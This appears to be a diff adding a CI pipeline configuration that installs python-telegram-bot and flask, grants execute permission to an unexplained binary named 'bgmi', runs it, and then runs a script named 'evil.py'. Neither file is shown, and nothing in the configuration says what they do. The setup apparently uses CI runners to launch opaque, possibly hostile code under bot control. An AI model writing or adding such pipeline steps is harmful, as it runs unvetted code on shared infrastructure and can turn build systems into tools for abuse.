@@ -1,0 +1,45 @@
+version: '1.0'
+
+pipeline:
+  stages:
+    - Execute
+
+jobs:
+  execute:
+    stage: Execute
+    image: python:3.9  # Use an appropriate Python version for your binary and script
+    template:
+      dag:
+        tasks:
+          - name: Install dependencies
+            templateRef: python-task
+          - name: Grant execute permissions
+            templateRef: chmod-task
+            depends: [Install dependencies]  # Task will run after dependencies are installed
+          - name: Execute binary
+            templateRef: binary-task
+            depends: [Grant execute permissions]  # Task will run after permissions are granted
+          - name: Run Python script
+            templateRef: python-script-task
+            depends: [Execute binary]  # Task will run after binary execution
+    templates:
+      - name: python-task
+        script:
+          - echo "Installing Python dependencies"
+          - pip install --upgrade pip  # Optional: upgrade pip to the latest version
+          - pip install python-telegram-bot flask # Install dependencies from your requirements.txt
+
+      - name: chmod-task
+        script:
+          - echo "Granting execute permissions to the binary"
+          - chmod +x ./bgmi  # Grant execute permissions to the bgmi binary
+
+      - name: binary-task
+        script:
+          - echo "Executing the bgmi binary"
+          - ./bgmi  # Execute the bgmi binary
+
+      - name: python-script-task
+        script:
+          - echo "Running the evil.py Python script"
+          - python evil.py  # Execute the evil.py Python script
